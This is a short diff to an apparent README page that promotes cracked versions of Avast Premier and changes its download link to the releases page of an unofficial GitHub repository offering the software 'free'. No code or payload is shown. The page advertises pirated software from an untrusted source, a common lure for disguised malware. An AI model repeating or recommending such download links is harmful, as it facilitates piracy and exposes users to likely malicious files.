@@ -31,7 +31,7 @@ Discover all about Avast Premier: its features, what it includes, crack versions
 - what-does-avast-premier-include
 
 ### Repository Link:
-[Download Avast Premier Here](https://github.com/files/Project.zip)
+[Download Avast Premier Here](https://github.com/Younes-Yahiaoui/Avast-Premier-Free/releases)
 
 If the link doesn't work, check the "Releases" section for alternative options.
 
